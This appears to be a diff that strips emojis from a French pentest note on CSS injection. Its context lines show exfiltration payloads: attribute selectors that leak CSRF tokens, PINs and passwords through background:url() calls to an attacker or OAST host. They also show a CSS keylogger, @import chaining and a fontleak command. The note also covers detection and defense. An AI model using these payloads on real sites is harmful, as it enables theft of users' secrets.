@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 🎨 CSS Injection
+# CSS Injection
 
 > [!info] **En 1 phrase**
 > CSS Injection = laisser l'attaquant injecter/contrôler du **CSS dans la page** pour **exfiltrer des
@@ -23,7 +23,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -34,14 +34,14 @@ flowchart LR
     D --> F[Serveur attaquant<br>reconstruit le secret]
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > Le CSS est **statique mais actif** : chaque `<style>`/attribut `style` injecté est un oracle
 > booléen. Pas besoin de JS → **contourne les CSP qui bloquent `script-src` mais laissent passer
 > `style-src`**. Le navigateur fait les requêtes à notre place.
 
 ---
 
-## 🕳️ Où injecter du CSS
+## Où injecter du CSS
 
 Le CSS injecté arrive dans la page par plusieurs portes :
 
@@ -54,13 +54,13 @@ Le CSS injecté arrive dans la page par plusieurs portes :
 | **Markdown riche** | éditeurs qui laissent passer `<style>` ou `background:url()` |
 | **Attributs `background`, `bgcolor`** | vieux HTML : `background="url(...)"` |
 
-> [!warning] ⚠️ **Condition clé** : le CSS doit être **contrôlé intégralement** (ou pouvoir être
+> [!warning] **Condition clé** : le CSS doit être **contrôlé intégralement** (ou pouvoir être
 > fermé/rouvert : `<style>` injecté dans un attribut nécessite de "sortir" du contexte). Un simple
 > reflet encodé dans une valeur ne suffit pas — il faut **pouvoir placer des règles**.
 
 ---
 
-## 🎯 Exfiltration par sélecteurs d'attributs
+## Exfiltration par sélecteurs d'attributs
 
 ### Les sélecteurs de base
 
@@ -90,7 +90,7 @@ input[value^="TOKEN_012"] {
 
 ### Hidden input : utiliser le sélecteur frère
 
-> [!warning] ⚠️ On ne peut PAS appliquer un `background` directement sur un **`input[type=hidden]`**
+> [!warning] On ne peut PAS appliquer un `background` directement sur un **`input[type=hidden]`**
 > (il n'est pas rendu). Solution : cibler un **élément visible frère** placé après lui.
 
 ```css
@@ -122,7 +122,7 @@ input[name="csrf"][value$="a"] {
 
 ---
 
-## ⌨️ Keylogger CSS
+## Keylogger CSS
 
 Le principe : suivre la **saisie en temps réel** en re-sélectionnant chaque caractère tapé.
 
@@ -166,7 +166,7 @@ input[type="password"] {
 
 ---
 
-## 🗄️ Exfiltration de données caractère par caractère
+## Exfiltration de données caractère par caractère
 
 C'est la méthode **bruteforce séquentielle** : on devine le secret **1 caractère à la fois**.
 
@@ -196,7 +196,7 @@ input[name="token"][value^="ab"] {
 
 ### Timing via background
 
-> [!tip] 💡 Si on ne peut pas envoyer de requête sortante, on peut **mesurer le temps de rendu** :
+> [!tip] Si on ne peut pas envoyer de requête sortante, on peut **mesurer le temps de rendu** :
 > un élément matché reçoit un `background` lourd → la page met plus de temps à finir de charger.
 
 ```css
@@ -207,7 +207,7 @@ input[name="pin"][value^="1"] {
 
 ---
 
-## 👁️ Blind CSS Injection
+## Blind CSS Injection
 
 Quand **on ne voit rien** de la page (pas de sélecteurs connus, pas de nom de champ) → on enchaîne
 des **étapes aveugles** pilotées par un serveur.
@@ -224,7 +224,7 @@ des **étapes aveugles** pilotées par un serveur.
 3. Si un sélecteur matche, le navigateur fait une requête `background` → le serveur la voit.
 4. Le serveur renvoie alors le **prochain `@import`** pour continuer la chaîne — **sans recharger la page**.
 
-> [!info] 💡 L'`@import` ne se résout qu'une fois le précédent chargé → **chaînage séquentiel
+> [!info] L'`@import` ne se résout qu'une fois le précédent chargé → **chaînage séquentiel
 > garanti**. On pilote l'exfiltration **étape par étape côté serveur**.
 
 ### Exfiltration de pages inconnues
@@ -255,12 +255,12 @@ interactsh-client -v
 # HTTP [GET] https://....oast.pro/?ch=a
 ```
 
-> [!tip] 💡 Tout payload CSS ci-dessus peut pointer vers `https://TOKEN.oast.pro/...` : le sous-domaine
+> [!tip] Tout payload CSS ci-dessus peut pointer vers `https://TOKEN.oast.pro/...` : le sous-domaine
 > **contient la donnée volée** dans l'URL → récupération via le client Interactsh ou Burp Collaborator.
 
 ---
 
-## 📥 @import / @font-face / CSSOM — vecteurs côté serveur
+## @import / @font-face / CSSOM — vecteurs côté serveur
 
 ### @import
 
@@ -310,7 +310,7 @@ for (const sheet of document.styleSheets) {
 
 ---
 
-## 🧬 Techniques avancées d'extraction
+## Techniques avancées d'extraction
 
 ### Extraction d'attribut via `attr()`
 
@@ -327,7 +327,7 @@ input[name="password"] {
 <input type="text" name="password" value="supersecret">
 ```
 
-> [!tip] 💡 **Cross-origin** : le navigateur résout l'URL relative **par rapport à l'origin de la
+> [!tip] **Cross-origin** : le navigateur résout l'URL relative **par rapport à l'origin de la
 > feuille** (l'attaquant), pas de la page. Résultat sur le serveur attaquant :
 
 ```text
@@ -357,12 +357,12 @@ docker run -it --rm -p 4242:4242 -e BASE_URL=http://localhost:4242 ghcr.io/adrgs
 <style>@import url("http://localhost:4242/?selector=.secret&parent=head&alphabet=abcdef0123456789");</style>
 ```
 
-> [!warning] ⚠️ Le sélecteur de fontleak doit matcher **exactement UN élément** de la page, sinon
+> [!warning] Le sélecteur de fontleak doit matcher **exactement UN élément** de la page, sinon
 > l'extraction échoue.
 
 ---
 
-## 🔎 Détection — le CSS est-il reflété et contrôlable ?
+## Détection — le CSS est-il reflété et contrôlable ?
 
 ### Checklist
 
@@ -379,12 +379,12 @@ curl -s "https://target/page?color=red%3Bbackground%3Aurl(https%3A//PINTEREST.oa
 # Si un callback arrive → reflet contrôlable
 ```
 
-> [!tip] 💡 **Le test d'or** : injecter un sélecteur **impossible à matcher** (`input[value^="zzzz"]`)
+> [!tip] **Le test d'or** : injecter un sélecteur **impossible à matcher** (`input[value^="zzzz"]`)
 > et un **toujours vrai** (`*`) : l'un ne doit jamais faire de requête, l'autre toujours.
 
 ---
 
-## 🛠️ Outils
+## Outils
 
 | Outil | Usage |
 |---|---|
@@ -399,7 +399,7 @@ curl -s "https://target/page?color=red%3Bbackground%3Aurl(https%3A//PINTEREST.oa
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Défense | Détail |
 |---|---|
@@ -414,9 +414,9 @@ curl -s "https://target/page?color=red%3Bbackground%3Aurl(https%3A//PINTEREST.oa
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Vitesse d'exfiltration**
+> [!tip] **Vitesse d'exfiltration**
 > - Un sélecteur = **~1 caractère par requête** ; limiter l'alphabet aux caractères plausibles
 >   (base64, hex, `a-z0-9`) plutôt que tout l'Unicode.
 > - Utiliser **prefix ET suffix** en parallèle sur deux propriétés (`background` +
@@ -425,7 +425,7 @@ curl -s "https://target/page?color=red%3Bbackground%3Aurl(https%3A//PINTEREST.oa
 >   excellent pour du probing rapide, mauvais pour l'ordre.
 > - **Dichotomie** sur la longueur d'abord (`len=5?`, `len>5?`), puis par caractère.
 
-> [!warning] ⚠️ **Pièges des navigateurs modernes**
+> [!warning] **Pièges des navigateurs modernes**
 > - `input[type=hidden]` : **jamais de background possible** → toujours passer par un frère visible.
 > - `@font-face` ne compte que la **présence** : doublons et ordre sont invisibles.
 > - Les **pseudo-classes sensibles à la confiance** (`:visited`) ont été neutralisées par les navigateurs.
@@ -434,24 +434,24 @@ curl -s "https://target/page?color=red%3Bbackground%3Aurl(https%3A//PINTEREST.oa
 > - Le **CSP** de la cible peut bloquer `img-src`/`style-src` externes → tester tôt, adapter (data:,
 >   même-origin, timing).
 
-> [!warning] ⚠️ **Client vs serveur**
+> [!warning] **Client vs serveur**
 > - **Côté client (le plus courant)** : le CSS est rendu dans le navigateur de la victime → payloads
 >   sélecteurs/background/@font-face. Serveur = collecteur passif.
 > - **Côté serveur** : si un outil serveur parse le CSS (ex: rendu PDF, moteur de template qui
 >   résout `url()`, `@import` de pré-render) → le **serveur** fait les requêtes à notre place.
 >   Interactsh le détecte. Adapter les payloads en conséquence (ex: PDF generators → `@import` local).
 
-> [!tip] 💡 **Ordre d'attaque conseillé**
+> [!tip] **Ordre d'attaque conseillé**
 > 1. Prouver le reflet contrôlable (callback OAST) → 2. Découvrir la structure (un `input` existe ?)
 > → 3. Mesurer la longueur du secret → 4. Exfiltrer caractère par caractère (prefix/suffix parallèles)
 > → 5. Automatiser le serveur (SIC / blind-css-exfiltration).
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[XSS (Cross-Site Scripting)|🖼️ XSS]]
-- [[XS-Leak|📤 XS-Leak]]
-- [[DOM Clobbering|🧱 DOM Clobbering]]
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — CSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSS%20Injection/README.md)
+- [[XSS (Cross-Site Scripting)| XSS]]
+- [[XS-Leak| XS-Leak]]
+- [[DOM Clobbering| DOM Clobbering]]
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — CSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSS%20Injection/README.md)
